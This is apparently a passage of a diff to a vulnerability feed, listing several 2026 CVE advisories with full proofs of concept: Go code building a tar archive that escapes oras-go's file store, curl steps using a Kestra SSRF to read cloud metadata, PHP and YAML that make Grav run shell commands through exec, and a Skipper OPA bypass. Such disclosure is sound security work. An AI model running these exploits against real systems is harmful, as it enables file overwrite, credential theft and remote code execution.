`O_NOFOLLOW`, so if `path` is a symlink the write goes to its target.\n\n**Data flow / exploit construction.** Let `baseAbs = <workingDir>/<title>` and `N = depth(baseAbs)` (number of path components from `/`). The attacker's tar.gz contains, in order:\n\n1. `N` nested directories `<title>/d0/d1/…/d{N-1}`.\n2. A symlink `<title>/d0/…/d{N-1}/up` → `\"../../…\"` (`N` levels). Both lexically and on disk this resolves to `baseAbs`, so `ensureLinkPath` accepts it and `resolveRelToBase` sees only real directories in its ancestry.\n3. A symlink `<title>/escape` → `\"d0/…/d{N-1}/up/../../…/<absTarget>\"` (`N` `..` components after `up`). **Lexically**, `filepath.Join(baseAbs, \"d0/…/up/../…/<absTarget>\")` cancels the `N` `..` against `up` plus `d{N-2}…d0`, yielding `baseAbs/d0/<absTarget>` — inside the root, so `ensureLinkPath` accepts it. `resolveRelToBase` then walks `d0/<absTarget-parents>`, none of which are symlinks (they don't exist), so the link is created. **At the kernel**, resolving `baseAbs/d0/…/up` first follows `up` back to `baseAbs`, and the remaining `N` `..` components climb from `baseAbs` to `/`, then `<absTarget>` is appended — the symlink points at the attacker-chosen absolute path.\n4. A regular file `<title>/escape` (same name). `resolveRelToBase(\"escape\")` yields `dir == \".\"` (root cause 2), so no `Lstat` is performed. `extractTarDirectory` (line 181) calls `writeFile` which opens `baseAbs/escape` with `O_TRUNC` and no `O_NOFOLLOW` (root cause 3), writing the attacker's payload through the symlink to `<absTarget>`.\n\n**Why v2.6.1's `checkSymlinkEscape` does not help.** The fix for GHSA-8xwf-rjm4-xvhv added a symlink-resolving containment check, but it is called only from `resolveWritePath` (`content/file/file.go` line 632) on the **`pushFile`** path. `pushDir` → `extractTarGzip` → `extractTarDirectory` never calls it; `content/file/utils.go` is byte-identical between v2.6.0 and v2.6.1.\n\n**Suggested remediation.** Any of: (a) `Lstat` the final path component before opening for write and reject symlinks; (b) open with `O_NOFOLLOW` (or `O_EXCL` for new files); (c) resolve link targets with `filepath.EvalSymlinks` on the deepest existing ancestor (as `checkSymlinkEscape` already does) instead of lexical `filepath.Join`; (d) extract into a fresh empty directory and use `openat2(RESOLVE_BENEATH)` / `os.Root` (Go 1.24+) for all filesystem operations.\n\n### PoC\n```\ngo mod init poc\ngo get oras.land/oras-go/v2@v2.6.1\ngo run .\n```\n\n```go\n// Arbitrary file write outside a default-configured file.Store via\n// symlink-chain bypass in content/file.extractTarDirectory.\n//\n// ensureLinkPath() validates symlink targets purely lexically with\n// filepath.Join, which collapses \"..\" textually and does not follow\n// intermediate symlink components. By first planting a deep \"up\" symlink\n// that legitimately resolves to the extraction root, an \"escape\" symlink\n// can be crafted whose lexical target stays in-bounds but whose\n// kernel-resolved target is any absolute path. A follow-up TypeReg entry\n// with the same name is opened with O_CREATE|O_TRUNC (no O_NOFOLLOW),\n// writing through the symlink.\n//\n// Realistic trigger: oras.Copy() from an untrusted registry into a\n// file.New() store. The attacker controls the manifest (sets\n// AnnotationTitle + AnnotationUnpack=true on a layer) and the layer blob.\n// All digests are honest, so content verification passes.\npackage main\n\nimport (\n        \"archive/tar\"\n        \"bytes\"\n        \"compress/gzip\"\n        \"context\"\n        _ \"crypto/sha256\"\n        \"fmt\"\n        \"os\"\n        \"path/filepath\"\n        \"strings\"\n\n        \"github.com/opencontainers/go-digest\"\n        ocispec \"github.com/opencontainers/image-spec/specs-go/v1\"\n        \"oras.land/oras-go/v2/content/file\"\n)\n\nfunc main() {\n        if err := run(); err != nil {\n                fmt.Println(\"ERROR:\", err)\n                os.Exit(1)\n        }\n}\n\nfunc run() error {\n        ctx := context.Background()\n\n        // Victim's working directory for the file store.\n        workDir, err := os.MkdirTemp(\"\", \"oras-victim-*\")\n        if err != nil {\n                return err\n        }\n        defer os.RemoveAll(workDir)\n        fmt.Println(\"[*] file.Store working dir:\", workDir)\n\n        // Target path the attacker wants to write, OUTSIDE workDir.\n        // (Could be ~/.ssh/authorized_keys, ~/.bashrc, /etc/cron.d/x, etc.;\n        // a temp path keeps the demo self-contained.)\n        outsidePath := filepath.Join(os.TempDir(), \"oras-PWNED\")\n        _ = os.Remove(outsidePath)\n        defer os.Remove(outsidePath)\n        fmt.Println(\"[*] attacker target (outside workDir):\", outsidePath)\n\n        // The layer's AnnotationTitle. extractTarDirectory uses this as both the\n        // in-tar prefix and the on-disk subdir under workDir.\n        const title = \"out\"\n        baseAbs := filepath.Join(workDir, title)\n\n        // N nested dirs + a symlink \"up\" -> N*\"../\" so that after the kernel\n        // follows \"up\" (landing at baseAbs) the remaining N lexical \"..\"\n        // components climb from baseAbs to \"/\". N must be >= depth(baseAbs).\n        depth := len(strings.Split(strings.Trim(filepath.ToSlash(baseAbs), \"/\"), \"/\"))\n        fmt.Printf(\"[*] baseAbs depth = %d, building %d nested dirs\\n\", depth, depth)\n\n        gz, dgst, size, err := buildMaliciousLayer(title, depth, outsidePath)\n        if err != nil {\n                return err\n        }\n\n        // Descriptor exactly as it would appear in a manifest's \"layers\" array.\n        desc := ocispec.Descriptor{\n                MediaType: \"application/vnd.oci.image.layer.v1.tar+gzip\",\n                Digest:    dgst,\n                Size:      size,\n                Annotations: map[string]string{\n                        ocispec.AnnotationTitle: title,\n                        file.AnnotationUnpack:   \"true\",\n                },\n        }\n\n        // Victim creates a file store with default settings (path traversal DISALLOWED).\n        store, err := file.New(workDir)\n        if err != nil {\n                return err\n        }\n        defer store.Close()\n        fmt.Println(\"[*] store.AllowPathTraversalOnWrite =\", store.AllowPathTraversalOnWrite)\n\n        // This is exactly what oras.Copy() invokes per layer.\n        if err := store.Push(ctx, desc, bytes.NewReader(gz)); err != nil {\n                return fmt.Errorf(\"Push: %w\", err)\n        }\n\n        // Check whether the out-of-tree file was written.\n        if data, err := os.ReadFile(outsidePath); err == nil {\n                rel, _ := filepath.Rel(workDir, outsidePath)\n                fmt.Printf(\"\\n[!] BYPASS: wrote %q to %s\\n\", string(data), outsidePath)\n                fmt.Printf(\"[!] relative to workDir: %s\\n\", rel)\n                fmt.Println(\"[!] PATH TRAVERSAL CONFIRMED - file written OUTSIDE file.Store working dir\")\n                return nil\n        }\n        fmt.Println(\"\\n[-] no escape (file not created at\", outsidePath, \")\")\n        return nil\n}\n\n// buildMaliciousLayer builds a tar.gz that, when extracted by\n// content/file.extractTarDirectory under <workDir>/<title>, writes to outsidePath.\nfunc buildMaliciousLayer(title string, depth int, outsidePath string) ([]byte, digest.Digest, int64, error) {\n        var buf bytes.Buffer\n        gzw := gzip.NewWriter(&buf)\n        tw := tar.NewWriter(gzw)\n\n        // 1. Nested directories: title/d0/d1/.../d{depth-1}\n        dirs := make([]string, depth)\n        for i := 0; i < depth; i++ {\n                dirs[i] = fmt.Sprintf(\"d%d\", i)\n        }\n        for i := 1; i <= depth; i++ {\n                name := title + \"/\" + strings.Join(dirs[:i], \"/\")\n                if err := tw.WriteHeader(&tar.Header{Typeflag: tar.TypeDir, Name: name, Mode: 0o755}); err != nil {\n                        return nil, \"\", 0, err\n                }\n        }\n\n        // 2. \"up\" symlink at the bottom, pointing back to baseAbs via depth*\"../\".\n        //    Lexically AND on disk this resolves to baseAbs - passes ensureLinkPath.\n        upName := title + \"/\" + strings.Join(dirs, \"/\") + \"/up\"\n        upTarget := strings.Repeat(\"../\", depth-1) + \"..\"\n        if err := tw.WriteHeader(&tar.Header{Typeflag: tar.TypeSymlink, Name: upName, Linkname: upTarget, Mode: 0o777}); err != nil {\n                return nil, \"\", 0, err\n        }\n\n        // 3. \"escape\" symlink at title/escape.\n        //    Target = d0/.../d{N-1}/up/../.. (N times) /<outsidePath>\n        //    LEXICAL clean: the N \"..\" cancel \"up\" + (N-1) dirs, leaving\n        //      d0/<outsidePath>  - INSIDE baseAbs, so ensureLinkPath accepts it.\n        //    KERNEL: d0/.../up follows the symlink to baseAbs, then N*\"..\"\n        //      climbs to \"/\", then appends outsidePath.\n        dots := strings.Repeat(\"../\", depth-1) + \"..\"\n        escapeTarget := strings.Join(dirs, \"/\") + \"/up/\" + dots + outsidePath\n        if err := tw.WriteHeader(&tar.Header{Typeflag: tar.TypeSymlink, Name: title + \"/escape\", Linkname: escapeTarget, Mode: 0o777}); err != nil {\n                return nil, \"\", 0, err\n        }\n\n        // 4. Regular file entry at title/escape - same path as the symlink.\n        //    resolveRelToBase(\"escape\") has dir==\".\" so the per-component Lstat\n        //    loop never runs; writeFile opens with O_CREATE|O_TRUNC (no\n        //    O_NOFOLLOW) and writes through the symlink to outsidePath.\n        payload := []byte(\"PWNED-BY-ORAS-TARSLIP\")\n        if err := tw.WriteHeader(&tar.Header{Typeflag: tar.TypeReg, Name: title + \"/escape\", Mode: 0o644, Size: int64(len(payload))}); err != nil {\n                return nil, \"\", 0, err\n        }\n        if _, err := tw.Write(payload); err != nil {\n                return nil, \"\", 0, err\n        }\n\n        if err := tw.Close(); err != nil {\n                return nil, \"\", 0, err\n        }\n        if err := gzw.Close(); err != nil {\n                return nil, \"\", 0, err\n        }\n\n        data := buf.Bytes()\n        return data, digest.FromBytes(data), int64(len(data)), nil\n}\n```\n\nExpected output (paths vary):\n\n```\n[*] file.Store working dir: /tmp/oras-victim-209731351\n[*] attacker target (outside workDir): /tmp/oras-PWNED\n[*] baseAbs depth = 3, building 3 nested dirs\n[*] store.AllowPathTraversalOnWrite = false\n\n[!] BYPASS: wrote \"PWNED-BY-ORAS-TARSLIP\" to /tmp/oras-PWNED\n[!] relative to workDir: ../oras-PWNED\n[!] PATH TRAVERSAL CONFIRMED - file written OUTSIDE file.Store working dir\n```\n\n### Impact\n**Who is affected:** Any application that pulls or pushes OCI artifacts from an untrusted or attacker-influenced source into a `content/file.Store` — e.g. `oras.Copy(ctx, remoteRepo, ref, file.New(dir), ref, opts)`, the documented primary use of the file store — with default settings (`AllowPathTraversalOnWrite=false`, `SkipUnpack=false`). Downstream consumers include the ORAS CLI (`oras pull` to a directory) and tools built on oras-go that materialise artifact contents on disk.\n\n**What the attacker gains:** Arbitrary file create/overwrite anywhere writable by the pulling process. Practical escalations include overwriting `~/.ssh/authorized_keys`, `~/.bashrc`/`~/.profile`, Git hooks, or (when running as root, e.g. in CI or a controller) `/etc/cron.d/*` or binaries on `$PATH` — i.e. remote code execution on the victim host.\n\n**Preconditions / reachability:** No local preconditions beyond pulling an attacker-controlled artifact; the attacker does **not** need any pre-existing symlink in the victim's working directory (unlike GHSA-8xwf-rjm4-xvhv / CVE-2026-50162, which this issue is distinct from). The attack is delivered over the network via a registry the victim pulls from; no authentication to the victim is required. User interaction is limited to the victim choosing to pull the artifact (`UI:R`).",
-      "cvssScore": 8.8,
-      "severity": "High",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
-      "cwe": {
-        "cwe_id": "CWE-22",
-        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
-      },
-      "references": [
-        "https://github.com/oras-project/oras-go/security/advisories/GHSA-m37j-52j7-pjw7",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-85731",
-        "https://github.com/oras-project/oras-go/commit/adab2f25ea95ef4e6e41f50db9266a6701399422",
-        "https://github.com/oras-project/oras-go/releases/tag/v2.6.2",
-        "https://github.com/advisories/GHSA-m37j-52j7-pjw7"
-      ],
-      "vulnerableProducts": [
-        "oras.land/oras-go/v2 go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-73247",
-      "summary": "### Summary\nThe Pebble template engine's `http()` function in Kestra OSS accepts user-controlled URLs without any validation, allowing Server-Side Request Forgery (SSRF) attacks. An unauthenticated attacker can import a malicious Flow YAML and execute it to access internal services, cloud metadata endpoints (AWS 169.254.169.254), or localhost services. The vulnerability affects all Kestra OSS deployments with default configuration.\n\n### Details\nThe root cause is in `core/src/main/java/io/kestra/core/runners/pebble/functions/HttpFunction.java` (lines 77-106):\n\n1. **No URL validation**: User input is passed directly to `URI.create()` with no checks for private IPs, internal hosts, or restricted schemes\n2. **No IP filtering**: Missing checks for 10.0.0.0/8, 192.168.0.0/16, 169.254.169.254, 127.0.0.1\n3. **No scheme restriction**: `file://`, `gopher://` schemes are not blocked\n4. **No authentication required**: `TenantValidationFilter.java` only checks tenant == \"main\" — no authentication\n5. **Unconditional registration**: `HttpFunction` is registered without any feature flags in `Extension.java:180`\n\n### PoC\n**Prerequisites:**\n```bash\ndocker run -d --name kestra-ssrf -p 8080:8080 kestra/kestra:latest server local\nsleep 30\n```\n\n**Step 1: Create malicious Flow YAML**\n```yaml\ncat > /tmp/ssrf_poc.yaml << 'YAML'\nid: ssrf_metadata\nnamespace: company.team\ntasks:\n  - id: exfiltrate\n    type: io.kestra.plugin.core.log.Log\n    message: |\n      {{ http(uri='http://169.254.169.254/latest/meta-data/', method='GET') }}\nYAML\n```\n\n**Step 2: Import without authentication**\n```bash\ncurl -X POST http://localhost:8080/api/v1/main/flows/import \\\n  -F \"fileUpload=@/tmp/ssrf_poc.yaml\"\n```\n\n**Step 3: Execute the flow**\n```bash\ncurl -X POST http://localhost:8080/api/v1/main/executions/company.team/ssrf_metadata\n```\n\n**Step 4: Verify** — the flow execution output contains AWS EC2 metadata (ami-id, instance-type, IAM credentials if available)\n\n### Impact\n- **CVSS 3.1**: 8.6 (HIGH) — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N\n- **CWE**: CWE-918 (Server-Side Request Forgery)\n- **Affected**: All Kestra OSS versions (default deployment)\n- **Impact**: Attackers can access internal services, cloud metadata (AWS/GCP/Azure), localhost endpoints, and potentially escalate to cloud credential theft",
-      "cvssScore": 8.6,
-      "severity": "High",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
-      "cwe": {
-        "cwe_id": "CWE-918",
-        "name": "Server-Side Request Forgery (SSRF)"
-      },
-      "references": [
-        "https://github.com/kestra-io/kestra/security/advisories/GHSA-r56g-q4p6-m3p6",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-73247",
-        "https://github.com/advisories/GHSA-r56g-q4p6-m3p6"
-      ],
-      "vulnerableProducts": [
-        "io.kestra:core maven",
-        "io.kestra:kestra-core maven"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-65608",
-      "summary": "### Summary\n\nA missing validation check in Grav's Flex framework lets an account holding nothing but an ordinary object-create permission on a single Flex directory execute arbitrary shell commands on the server. Any authenticated user with `create` or `update` rights on a Flex-based directory (Flex Users, Flex Pages, Flex Objects, or any custom Flex type) can trigger it the moment a blueprint field anywhere in that directory carries a `data-*@:` directive, since the code that resolves those directives calls `call_user_func_array()` on attacker-influenced input with no restriction at all.\n\nThis is a bypass of GHSA-fj2p-qj2f-74v5, already patched in 2.0.7. That fix added real validation to `Blueprint::dynamicData()`, but Grav's Flex system routes the same directive through a separate, unprotected method, `FlexDirectory::dynamicDataField()`, which never received the same fix.\n\n### Details\n\nGrav blueprints support `action-property@:` directives, YAML keys that tell the blueprint engine to compute a field's value dynamically by calling a function. `Blueprint::init()` (`system/src/Grav/Common/Data/Blueprint.php:167-177`) resolves these by checking for a registered handler first, and only falling back to the built-in `dynamic{Action}` method if none is registered:\n\n```php\nforeach ($data as $property => $call) {\n    $action = $call['action'];\n    $method = 'dynamic' . ucfirst((string) $action);\n    $call['object'] = $this->object;\n\n    if (isset($this->handlers[$action])) {\n        $callable = $this->handlers[$action];\n        $callable($current, $property, $call);\n    } elseif (method_exists($this, $method)) {\n        $this->{$method}($current, $property, $call);\n    }\n}\n```\n\n`FlexDirectory::getBlueprint()` (`system/src/Grav/Framework/Flex/FlexDirectory.php:878-880`) registers exactly such a handler for the `data` action, for every Flex directory:\n\n```php\n$blueprint->addDynamicHandler('data', function (array &$field, $property, array &$call) {\n    $this->dynamicDataField($field, $property, $call);\n});\n```\n\nBecause a handler is registered, `Blueprint::init()` never falls through to the patched `Blueprint::dynamicData()`. It calls `FlexDirectory::dynamicDataField()` instead (`system/src/Grav/Framework/Flex/FlexDirectory.php:906-928`):\n\n```php\nprotected function dynamicDataField(array &$field, $property, array $call)\n{\n    $params = $call['params'];\n    if (is_array($params)) {\n        $function = array_shift($params);\n    } else {\n        $function = $params;\n        $params = [];\n    }\n\n    $object = $call['object'];\n    if ($function === '\\Grav\\Common\\Page\\Pages::pageTypes') {\n        $params = [$object instanceof PageInterface && $object->isModule() ? 'modular' : 'standard'];\n    }\n\n    $data = null;\n    if (is_callable($function)) {\n        $data = call_user_func_array($function, $params);\n    }\n    // ...\n}\n```\n\n`is_callable()` only checks that `$function` resolves to something callable. It does not check whether calling it is safe. `'exec'`, `'system'`, `'passthru'`, and `'shell_exec'` are all valid PHP callables, so this passes them through without complaint.\n\nCompare this to the patched `Blueprint::dynamicData()` (`system/src/Grav/Common/Data/Blueprint.php:426-448`), which calls `$this->isSafeDynamicCall($function, $params)` before doing anything. That method denies known command-execution functions (`exec`, `system`, `passthru`, `shell_exec`, `popen`, `proc_open`, `pcntl_exec`), known code-execution functions (`assert`, `preg_replace`, `create_function`, `include`, `require`), and recursively checks the argument list for a dangerous callable smuggled in as a parameter, which is the trampoline pattern the original GHSA exploited through `Utils::arrayFilterRecursive`. None of that logic exists in `dynamicDataField()`.\n\n**Version tested:** current `master`, commit `fae9e1bf2c40ce0b50d0dfce647aaa1d22f98969`. `git describe` reports this as `2.0.8-2-gfae9e1bf2`, two commits past the `2.0.8` tag. I checked those two commits directly: one is a merge commit, the other fixes spaces in Markdown image/link filenames (`ParsedownGravTrait.php`, unrelated). Neither touches `Blueprint.php`, `FlexDirectory.php`, or `Utils.php`. `git diff 2.0.8 -- system/src/Grav/Framework/Flex/FlexDirectory.php system/src/Grav/Common/Data/Blueprint.php` returns no output, so the vulnerable code is byte-for-byte identical to what shipped in the released 2.0.8 version. I also checked the CHANGELOG for 2.0.7, 2.0.8, and the not-yet-tagged 2.0.9 entry: 2.0.7 documents the original GHSA-fj2p-qj2f-74v5 fix, and neither 2.0.8 nor 2.0.9 mentions Flex, dynamic field data, or any related change. The two methods were never unified, so this gap has existed since the original patch shipped in 2.0.7 and is still present in the latest code as of this report.\n\n### PoC\n\n**Part 1, code level.** This is the minimal, self-contained reproduction: no web server, no plugins, no accounts, just a checkout with `composer install` run. It calls the real, unmodified `FlexDirectory::dynamicDataField()` directly and is a suitable regression check for confirming the fix; once the method is patched to reject dangerous callables, this script should stop writing the proof file.\n\n```php\n<?php\nrequire 'vendor/autoload.php';\n\nuse Grav\\Common\\Data\\Blueprint;\nuse Grav\\Framework\\Flex\\FlexDirectory;\n\n$proofFile = '/tmp/grav_rce_proof.txt';\n\n// Mimics a Flex directory blueprint YAML file containing a data-test@: directive,\n// the same syntax the GHSA-fj2p-qj2f-74v5 PoC used against Blueprint::dynamicData().\n// No trampoline gadget needed here. dynamicDataField() performs zero validation\n// on $function.\n$items = [\n    'fields' => [\n        'myfield' => [\n            'type' => 'text',\n            'data-test@' => ['exec', \"id > $proofFile 2>&1\"],\n        ],\n    ],\n];\n\n$blueprint = new Blueprint(null, $items);\n$blueprint->embed('', $items); // triggers deepInit(), populates $blueprint->dynamic\n\n// Register the real, unmodified FlexDirectory::dynamicDataField as the 'data'\n// handler. This is exactly what FlexDirectory::getBlueprint() does for every\n// Flex directory in production.\n$refClass = new ReflectionClass(FlexDirectory::class);\n$flexDirectoryInstance = $refClass->newInstanceWithoutConstructor();\n$method = $refClass->getMethod('dynamicDataField');\n$method->setAccessible(true);\n\n$blueprint->addDynamicHandler('data', function (array &$field, $property, array &$call) use ($method, $flexDirectoryInstance) {\n    $method->invoke($flexDirectoryInstance, $field, $property, $call);\n});\n\n$blueprint->init();\n\necho file_exists($proofFile) ? file_get_contents($proofFile) : \"not vulnerable\\n\";\n```\n\nOutput:\n\n```\nuid=1000(d) gid=1000(d) groups=1000(d),4(adm),...\n```\n\n**Part 2, full HTTP chain against the real admin panel.** Configuration used:\n\n- Base checkout: same commit as above.\n- `bin/gpm install admin flex-objects -y`, which pulls in `form`, `login`, `email`, `shortcode-core`, `api` as dependencies.\n- `php -S localhost:8000 system/router.php`.\n\nStep 1. `flex-objects` ships a self-contained sample custom directory at `blueprints/flex-objects/contacts.yaml`, with its own `admin.contacts`/`api.contacts` permission set. Added one field to its `form.fields`:\n\n```yaml\n    pocfield:\n      type: text\n      label: PoC Field\n      data-test@:\n        - exec\n        - \"id > /tmp/grav_http_rce_proof.txt 2>&1\"\n```\n\nStep 2. Registered `contacts` as an active directory through a normal config override, the same file the admin Plugin Configuration screen writes to (`user/config/plugins/flex-objects.yaml`):\n\n```yaml\ndirectories:\n  - 'blueprints://flex-objects/pages.yaml'\n  - 'blueprints://flex-objects/user-accounts.yaml'\n  - 'blueprints://flex-objects/user-groups.yaml'\n  - 'blueprints://flex-objects/contacts.yaml'\n```\n\nStep 3. Confirmed a full super-admin account can trigger it, as a baseline. `POST /api/v1/flex-objects/contacts` (the ordinary \"create a new contact\" endpoint) with a super-admin JWT:\n\n```\nHTTP 201 Created\n```\n\n`/tmp/grav_http_rce_proof.txt` contained the `id` command's output. This confirms the chain fires through the real API: `FlexApiController::create()` calls `FlexDirectory::createObject()`/`save()`, which calls blueprint `init()`, which calls `dynamicDataField()`, which calls `call_user_func_array('exec', [...])`. The read-only blueprint-serving endpoint, `GET /blueprints/flex-objects/{type}`, does not trigger this; only the create/update processing path calls `init()`.\n\nStep 4. Created a second account with nothing granted except:\n\n```yaml\naccess:\n  admin:\n    login: true\n  api:\n    access: true\n    contacts:\n      create: true\n```\n\nNo `admin.super`, no `api.super`, no permission on anything except creating records in this one directory. That is exactly the permission `contacts.yaml`'s own blueprint declares for this action (`admin.permissions.api.contacts: {type: crudpl}` maps to `api.contacts.create`). The token response confirmed the account had nothing else: `\"super_admin\": false`, with only `api.access` and `api.contacts.create` set to `true`.\n\nThat account sent the same `POST /api/v1/flex-objects/contacts` request, an ordinary \"create a contact\" call indistinguishable from legitimate use:\n\n```\nHTTP 201 Created\n```\n\n`/tmp/grav_http_rce_proof.txt` was overwritten with fresh `id` output.\n\nThis was reproduced a second time on a completely separate, freshly cloned checkout (independent `composer install`, independent `bin/gpm install`, new accounts) to rule out any dependency on leftover state from the first run. Same result both times.\n\n### Impact\n\n**Threat model.** The attacker needs an authenticated account with `create` or `update` permission on a single Flex directory, nothing more. The PoC account held exactly one permission, `api.contacts.create`, scoped to one custom directory, with `super_admin: false` and no other access. From that single permission it gets arbitrary shell command execution as the web server user, full remote code execution. That is a trust boundary crossing, not something inside the actor's own scope: a permission that is only supposed to let someone add records to one directory turns into unrestricted code execution on the server.\n\nAny Grav 2.0 install running the `flex-objects` plugin, or any other plugin that defines Flex directories (Flex Users and Flex Pages are Grav-core Flex types and go through the same unprotected code path), is affected once a blueprint field anywhere carries a `data-*@:` directive. Whoever can place that directive into an active blueprint needs a separate level of access to do so. I was not able to independently confirm from this checkout alone whether Grav ships an admin-panel flow that lets a non-superadmin write field-level blueprint YAML, since that logic likely lives in `flex-objects` or `admin` UI code outside what I traced. What is fully proven is the trigger side: once such a field exists, for any reason, an account that can only create records in that directory can run shell commands on the server. Per your own severity guidelines, that is a High: a lower-privilege actor ending up with capability well beyond their granted role.\n\n**Suggested fix**: route `FlexDirectory::dynamicDataField()` through the same `isSafeDynamicCall()`/`Utils::isDangerousFunction()` checks `Blueprint::dynamicData()` already uses, ideally by having it delegate to the patched method rather than reimplementing callable dispatch on its own. It would also be worth checking whether any other `addDynamicHandler()` registration in the codebase has the same gap.",
-      "cvssScore": 8.8,
-      "severity": "High",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
-      "cwe": {
-        "cwe_id": "CWE-470",
-        "name": "Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')"
-      },
-      "references": [
-        "https://github.com/getgrav/grav/security/advisories/GHSA-c4wf-2xxc-68qm",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-65608",
-        "https://github.com/getgrav/grav/commit/fae9e1bf2c40ce0b50d0dfce647aaa1d22f98969",
-        "https://www.vulncheck.com/advisories/grav-before-remote-code-execution-via-flexdirectory",
-        "https://github.com/advisories/GHSA-c4wf-2xxc-68qm"
-      ],
-      "vulnerableProducts": [
-        "getgrav/grav composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-86043",
-      "summary": "- **Affected component:** `filters/openpolicyagent/openpolicyagent.go` �� `ExtractHttpBodyOptionally`; combined with `github.com/open-policy-agent/opa-envoy-plugin` `envoyauth/request.go` → `getParsedBody` / `checkIfHTTPBodyTruncated`. Filter: `opaAuthorizeRequestWithBody`.\n- **Affected versions:** `<= 0.27.33` (current HEAD `e7d7014c`). The `truncated_body` mitigation was introduced/recommended in v0.27.26 (advisory GHSA-8qqm-fp2q-v734) and remains bypassable.\n- **Fix chain being audited:** CVE-2026-50197 (GHSA-659f-rgp5-w4wf, commit `3152f3b0`) → GHSA-8qqm-fp2q-v734 (docs + code, commit `1be950cd` #4126, v0.27.26). This finding is the third, still-open variant.\n\n## Summary\n\nSkipper's `opaAuthorizeRequestWithBody` filter authorizes requests by handing the (bounded) request body to Open Policy Agent. When a body exceeds `-open-policy-agent-max-request-body-size` (default 1 MB), Skipper truncates it before OPA sees it. Advisory **GHSA-8qqm-fp2q-v734** established that deny-on-presence / body-inspecting policies fail OPEN on oversized bodies, and its remediation instructs policy authors to **guard on `input.attributes.request.http.truncated_body`** (implemented as the top-level `input.truncated_body`):\n\n```rego\ndefault allow := false\nallow if {\n    input.truncated_body == false\n    # ... body-based conditions\n}\n```\n\nThat mitigation is itself incomplete. The `truncated_body` flag is computed by the OPA envoy plugin **only when a `content-length` header is present**. A request sent with `Transfer-Encoding: chunked` (HTTP/1.1) or over HTTP/2 carries **no `content-length`**, so `truncated_body` is left `false` even though Skipper truncated the body. The mitigated policy therefore evaluates `input.truncated_body == false` as *true* and **ALLOWS** the request, while the **full, un-inspected oversized payload is forwarded to the upstream** (Skipper's `bufferedBodyReader` streams the buffered prefix and then continues draining the original body).\n\nThe transport that defeats the mitigation — chunked / HTTP-2 without Content-Length — is the **exact transport class the original CVE-2026-50197 was about**; the GHSA-8qqm fix closed the declared-Content-Length variant and its positive-control test only exercised *small* chunked bodies, never *oversized* chunked bodies.\n\n## Root cause\n\n`opa-envoy-plugin/envoyauth/request.go`:\n\n```go\nfunc getParsedBody(...) (any, bool, error) {\n    if val, ok := headers[\"content-type\"]; ok {\n        if strings.Contains(val, \"application/json\") {\n            ...\n            if val, ok := headers[\"content-length\"]; ok {          // <-- only path that sets truncation\n                truncated, err := checkIfHTTPBodyTruncated(val, int64(len(body)))\n                ...\n                if truncated { return nil, true, nil }\n            }\n            ...\n        } else if ... \"application/x-www-form-urlencoded\" { /* same content-length gate */ }\n          else if ... \"multipart/form-data\"            { /* same content-length gate */ }\n    }\n    return data, false, nil     // <-- no content-length  ==> truncated_body = false\n}\n\nfunc checkIfHTTPBodyTruncated(contentLength string, bodyLength int64) (bool, error) {\n    cl, _ := strconv.ParseInt(contentLength, 10, 64)\n    if cl != -1 && cl > bodyLength { return true, nil }\n    return false, nil\n}\n```\n\nTruncation can only ever be signalled by comparing `content-length` against the received body length. With chunked/HTTP-2 there is no `content-length`, so the comparison is skipped and `truncated_body` is reported `false`. Skipper (`ExtractHttpBodyOptionally`) meanwhile *does* truncate the chunked body to `maxBodyBytes` (it sets `expectedSize = maxBodyBytes` when `req.ContentLength < 0`), producing the exact divergence: OPA is told \"not truncated\", but the body was truncated, and the backend receives the whole thing.\n\n## Reachability\n\n1. Deployment runs `opaAuthorizeRequestWithBody` with a body-inspecting policy that follows the GHSA-8qqm mitigation (`allow if input.truncated_body == false`). This is the maintainer-recommended configuration (advisory + v0.27.26 docs).\n2. Attacker sends a request whose body exceeds `max-request-body-size` using `Transfer-Encoding: chunked` (or HTTP/2). No `content-length` header is present.\n3. `ExtractHttpBodyOptionally` reads/truncates the body to `maxBodyBytes`; `rawBody` is the truncated prefix.\n4. `AdaptToExtAuthRequest` forwards the lowercased headers (no `content-length`) and the truncated `RawBody` to OPA.\n5. `getParsedBody` finds no `content-length` → `truncated_body = false`; for a non-parsed content-type it also returns `parsed_body = null` with no error.\n6. Policy: `input.truncated_body == false` is satisfied → `allow = true`.\n7. Skipper forwards the request; `bufferedBodyReader.Read` serves the buffered prefix and then continues reading the original `req.Body`, delivering the **full oversized payload** to the upstream.\n\nEvery guard on the path is accounted for: the only \"guard\" is `truncated_body`, and it is defeated by omitting `content-length`.\n\n## Impact\n\nBypass of OPA request-body authorization for any deployment that adopted the official `truncated_body` mitigation. Requests that the policy is meant to reject (oversized / un-inspectable bodies, or bodies whose forbidden content lies beyond the inspection window) are authorized and forwarded in full to the protected upstream. Same security property and severity class as CVE-2026-50197 / GHSA-8qqm (both High).\n\n## CVSS 3.1\n\nVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` = **7.5 High**\n\n- **AV:N** — remote HTTP request.\n- **AC:L** — single crafted request; no race/special conditions (just chunked framing + padding).\n- **PR:N / UI:N** — unauthenticated, no user interaction.\n- **S:U** — impact within the authorized component/upstream trust scope.\n- **C:N** — no direct disclosure by the bypass itself.\n- **I:H** — authorization control is bypassed; forbidden request content reaches the upstream (integrity of the access-control decision / protected resource).\n- **A:N** — not primarily an availability issue.\n\n(Conditional: exploitable only where `opaAuthorizeRequestWithBody` is used with a `truncated_body`-gated policy — i.e. deployments that followed the GHSA-8qqm mitigation. Consistent with the conditional nature of the parent CVEs.)\n\n## Proof of Concept\n\nExecutable Go test added to the OPA filter package. It stands up a real Skipper proxy (`proxy.WithParams`) + a real OPA control plane (`opasdktest`) with `WithMaxRequestBodyBytes(32)` and the advisory's verbatim mitigation policy (`allow if input.truncated_body == false`), routed to a recording upstream.\n\n- **Positive control** — oversized body **with Content-Length** → `truncated_body=true` → **403** (mitigation works).\n- **Bypass** — identical 